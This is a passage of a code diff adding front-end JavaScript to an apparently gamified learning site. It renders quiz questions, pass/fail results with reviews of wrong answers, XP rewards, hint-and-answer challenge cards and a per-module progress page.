+      ${isTrick?`<div style="background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.25);border-radius:6px;padding:.4rem .75rem;font-size:.72rem;color:var(--yellow);margin-bottom:.75rem;display:flex;align-items:center;gap:.4rem;">⚠️ TRICK QUESTION — Read carefully!</div>`:''}
+      <div class="quiz-q">
+        <span class="qnum">Question ${quizState.current+1} of ${questions.length}</span>
+        ${q.q}
+      </div>
+      <div class="quiz-options">
+        ${q.opts.map((opt,i)=>`
+          <div class="quiz-opt" id="qo${i}" onclick="selectAnswer(${i},${q.correct},${quizState.current},${questions.length})">
+            <div class="quiz-opt-letter">${letters[i]}</div>
+            ${opt}
+          </div>`).join('')}
+      </div>
+      <div class="quiz-feedback" id="quizFeedback"></div>
+    </div>`;
+}
+
+function selectAnswer(idx, correct, qIdx, total) {
+  document.querySelectorAll('.quiz-opt').forEach(o=>o.onclick=null);
+  const isCorrect=idx===correct;
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  const q=lesson.quiz[qIdx];
+  if(isCorrect) quizState.score++;
+  else quizState.wrongAnswers.push({question:q.q, yourAnswer:q.opts[idx], correctAnswer:q.opts[correct], explanation:q.exp, trick:q.trick});
+  quizState.answers.push({idx,correct,isCorrect});
+  document.querySelectorAll('.quiz-opt').forEach((o,i)=>{
+    if(i===correct) o.classList.add('correct');
+    else if(i===idx&&!isCorrect) o.classList.add('wrong');
+  });
+  const fb=document.getElementById('quizFeedback');
+  fb.className='quiz-feedback show '+(isCorrect?'correct':'wrong');
+  fb.innerHTML=(isCorrect?'✅ Correct! ':'❌ Wrong. ')+q.exp+
+    `<div style="margin-top:.75rem;display:flex;justify-content:flex-end">
+      <button class="btn btn-primary btn-sm" onclick="${quizState.current+1<total?'nextQuestion('+total+')':'showQuizResult('+total+')'}">
+        ${quizState.current+1<total?'Next Question →':'See Results'}
+      </button>
+    </div>`;
+}
+
+function nextQuestion(total) {
+  quizState.current++;
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  renderQuizQuestion(lesson.quiz);
+}
+
+function showQuizResult(total) {
+  const score=quizState.score;
+  const pct=Math.round(score/total*100);
+  const pass=pct>=90;
+  const lessonId=MODULES[currentModule].lessons[currentLessonIdx].id;
+  const xpEarned=pass?150:0;
+
+  if(pass&&!userProgress.passedQuizzes.includes(lessonId)){
+    userProgress.passedQuizzes.push(lessonId);
+    addXP(xpEarned);
+    sbSaveProgress();
+  }
+
+  const wrongHTML=quizState.wrongAnswers.length>0?`
+    <div style="text-align:left;margin-top:1.5rem;">
+      <div style="font-family:'Space Mono',monospace;font-size:.8rem;color:var(--accent);margin-bottom:.85rem;">
+        ${pass?'📝 Review your mistakes:':'📝 Concepts to review before retaking:'}
+      </div>
+      ${quizState.wrongAnswers.map((w,i)=>`
+        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:.85rem 1rem;margin-bottom:.65rem;border-left:3px solid var(--red);">
+          ${w.trick?`<div style="font-size:.65rem;color:var(--yellow);font-weight:700;margin-bottom:.3rem;">⚠️ TRICK QUESTION</div>`:''}
+          <div style="font-size:.8rem;font-weight:700;margin-bottom:.4rem;color:var(--text);">Q${i+1}: ${w.question}</div>
+          <div style="font-size:.75rem;color:var(--red);margin-bottom:.2rem;">✗ Your answer: ${w.yourAnswer}</div>
+          <div style="font-size:.75rem;color:var(--green);margin-bottom:.4rem;">✓ Correct: ${w.correctAnswer}</div>
+          <div style="font-size:.75rem;color:var(--muted);line-height:1.5;">${w.explanation}</div>
+        </div>`).join('')}
+    </div>`:'';
+
+  document.getElementById('lessonMain').innerHTML=`
+    <div class="quiz-wrap">
+      <div class="quiz-result">
+        <div style="font-family:'Space Mono',monospace;font-size:.75rem;color:var(--muted);margin-bottom:.5rem;">QUIZ RESULT</div>
+        <div class="score ${pass?'pass':'fail'}">${pct}%</div>
+        <div style="font-size:.82rem;color:var(--muted);margin-bottom:.35rem;">${score} correct out of ${total} questions</div>
+        <div style="font-weight:700;font-size:1.1rem;margin-bottom:.5rem;color:${pass?'var(--green)':'var(--red)'}">
+          ${pass?'🎉 Passed!':'❌ Not passed — 90% required'}
+        </div>
+        <div style="font-size:.82rem;color:var(--muted);margin-bottom:1.25rem;">
+          ${pass
+            ?`You earned <strong style="color:var(--accent)">${xpEarned} XP</strong>! Excellent work.`
+            :`You scored ${pct}% but need <strong style="color:var(--accent)">90%</strong> to continue. Review the concepts below, then retake.`
+          }
+        </div>
+        ${wrongHTML}
+        <div style="display:flex;gap:.75rem;justify-content:center;flex-wrap:wrap;margin-top:1.25rem;">
+          <button class="btn btn-ghost" onclick="currentSection='lesson';renderLesson()">📖 Review Lesson</button>
+          <button class="btn btn-secondary" onclick="startQuiz()">↩ Retake Quiz</button>
+          ${pass?`<button class="btn btn-primary" onclick="completeLesson(true)">Next Lesson →</button>`:''}
+        </div>
+      </div>
+    </div>`;
+}
+
+function completeLesson(advance) {
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  if(!userProgress.completedLessons.includes(lesson.id)) {
+    userProgress.completedLessons.push(lesson.id);
+    addXP(50);
+  }
+  sbSaveProgress();
+  if(advance&&currentLessonIdx<MODULES[currentModule].lessons.length-1) {
+    currentLessonIdx++;
+    currentSection='lesson';
+    renderLesson();
+  } else {
+    renderDashboard();
+    switchPage('dashboard');
+  }
+}
+
+// ══════════════════════════════════════════════
+// CHALLENGES
+// ══════════════════════════════════════════════
+function renderChallenges() {
+  document.getElementById('challengesList').innerHTML=CHALLENGES.map(c=>{
+    const solved=userProgress.solvedChallenges.includes(c.id);
+    const diffClass={'easy':'diff-easy','medium':'diff-medium','hard':'diff-hard'}[c.diff];
+    return `<div class="challenge-card">
+      <div class="challenge-title">${c.title} ${solved?'<span style="color:var(--green);font-size:.75rem">✓ SOLVED</span>':''}</div>
+      <div class="diff-badge ${diffClass}">${c.diff}</div>
+      <div style="font-size:.72rem;color:var(--muted);margin-bottom:.5rem;">Module: ${c.module} · +${c.xp} XP</div>
+      <div class="challenge-desc">${c.desc.replace(/\n/g,'<br>')}</div>
+      ${c.code?`<div class="code-block">${c.code}</div>`:''}
+      <div class="challenge-hint" onclick="toggleHint('h${c.id}')">💡 Show Hint</div>
+      <div class="challenge-hint-text" id="h${c.id}">${c.hint}</div>
+      ${!solved?`
+        <input class="challenge-input" id="ci${c.id}" placeholder="Enter your answer…" onkeydown="if(event.key==='Enter')checkChallenge('${c.id}')">
+        <button class="btn btn-primary btn-sm" onclick="checkChallenge('${c.id}')">Submit Answer</button>
+        <div style="min-height:1.2rem;margin-top:.5rem;font-size:.78rem;" id="cr${c.id}"></div>
+      `:`<div style="color:var(--green);font-size:.82rem;margin-top:.5rem;">✅ You solved this challenge!</div>`}
+    </div>`;
+  }).join('');
+}
+
+function toggleHint(id) {
+  const el=document.getElementById(id);
+  el.classList.toggle('show');
+}
+
+function checkChallenge(id) {
+  const c=CHALLENGES.find(x=>x.id===id);
+  const input=document.getElementById('ci'+id).value.trim();
+  const result=document.getElementById('cr'+id);
+  if(input.toLowerCase()===c.answer.toLowerCase()) {
+    if(!userProgress.solvedChallenges.includes(id)) {
+      userProgress.solvedChallenges.push(id);
+      addXP(c.xp);
+      sbSaveProgress();
+    }
+    document.getElementById('st-challenges').textContent=userProgress.solvedChallenges.length;
+    renderChallenges();
+  } else {
+    result.style.color='var(--red)';
+    result.textContent='✕ Incorrect. Try again!';
+  }
+}
+
+// ══════════════════════════════════════════════
+// PROGRESS PAGE
+// ══════════════════════════════════════════════
+function renderProgress() {
+  document.getElementById('pr-quizzes').textContent=userProgress.passedQuizzes.length;
+  document.getElementById('pr-challenges').textContent=userProgress.solvedChallenges.length;
+  document.getElementById('progressModules').innerHTML=MODULES.map(m=>{
+    const total=m.lessons.length;
+    const done=m.lessons.filter(l=>userProgress.completedLessons.includes(l.id)).length;
+    const pct=Math.round(done/total*100);
+    return `<div class="progress-module">
+      <div class="progress-module-icon">${m.icon}</div>
+      <div class="progress-module-info">
+        <div class="progress-module-name">${m.title}</div>
+        <div class="progress-bar"><div class="progress-fill" style="width:${pct}%"></div></div>
+      </div>
+      <div class="progress-pct">${pct}%</div>
+    </div>`;
+  }).join('');
+}
+
+// ══════════════════════════════════════════════
+// LOADING
+// ══════════════════════════════════════════════
+function hideLoading() { document.getElementById('loadingOverlay').classList.add('hidden'); }
+
+// ══════════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════════
+setTimeout(hideLoading, 800);
+</script>
+</body>
+</html>
